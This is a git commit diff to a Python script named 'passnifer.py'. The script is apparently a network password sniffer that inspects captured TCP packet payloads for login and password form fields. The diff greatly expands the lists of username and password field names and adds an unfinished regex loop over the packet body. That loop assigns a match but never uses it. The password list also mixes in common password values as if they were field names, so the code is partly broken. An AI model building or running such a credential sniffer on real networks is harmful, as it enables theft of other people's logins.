88bdc7aaa61409a57c5cc8ef8f5e3a8d4540bd84
Andrei <zenin.an@do-student.ru>
2023-04-15 19:41:27 +0300

    password sniffer

--- password_sniffer/passnifer.py
+++ password_sniffer/passnifer.py
@@ -13,17 +13,36 @@ if ifaces not in interfaces:
     print(colored("Ошибка: интерфейс {} не найден".format(ifaces), 'red'))
     exit()
 
-def get_login_pass():
+def get_login_pass(body):
     user = None
     passwd = None
-    userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                   'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                   'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                   'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
-                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
-    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
-                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
-                  'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario', 'customerid', 'profile',
+                  'Customer_User_Name', 'clientID', 'userID', 'userLoginID', 'AccountUserName', 'login_user',
+                  'authUser', 'weblogin', 'acct_login', 'member_login', 'guest', 'guest_user', 'owner',
+                  'Viewer_Account_Name', 'ClientAccountName', 'user-email', 'user_email', 'UserLoginID',
+                  'AccountLoginID', 'customer_name', 'client_name', 'user-login', 'login-user']
+    
+    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
+                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 
+                  'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena', 
+                  'contraseña', 'contrasinalogin', 'clave', 'claveacceso', 'accesscode', 'access_key', 
+                  'accesskey', 'auth', 'authorization', 'credentials', 'login_credentials', 'secret',
+                  'secretpassword', 'private_key', 'root_password', 'administrator_password', 'manager_password', 
+                  'mysql_pwd', 'mysql_password', 'db_password', 'ftp_password', 'imap_password', 'smtp_password', 
+                  'pop3_password', 'postgresql_password', 'vncpasswd', 'rpc_password', 'admin_pwd', 'administratorpwd',
+                  'apppassword', 'dbpwd', 'dbpasswd', 'dbspassword', 'encpassword', 'transactpwd', 'idpassword', 
+                  'username-password-authentication-password', 'LDAPLoginPassword', 'spring.security.password', 
+                  'p@ssword', 'passwd@123', 'pass123', 'superpassword', 'superscret', 'top_secret', 'ts_admin',
+                  'guru', 'god', 'test', 'testing', 'test123', 'welcome', 'hello', '123456', 'abc123', 'letmein']
+
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+    
+    
 
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
